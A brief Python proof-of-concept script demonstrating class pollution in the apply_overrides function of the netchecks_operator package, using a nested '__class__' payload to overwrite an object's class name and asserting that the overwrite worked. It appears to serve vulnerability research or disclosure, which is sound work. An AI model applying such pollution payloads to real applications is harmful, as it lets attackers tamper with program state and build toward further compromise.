# CLASS POLLUTION PROOF OF CONCEPT (PoC)
# Class Pollution Func: apply_overrides
# Type: get-both-set-both

from netchecks_operator.main import apply_overrides

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = {"__class__": {"__name__": payload_value}}

def run_poc():
  apply_overrides(target, PAYLOAD)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified!")

if __name__ == "__main__":
  verify_poc()
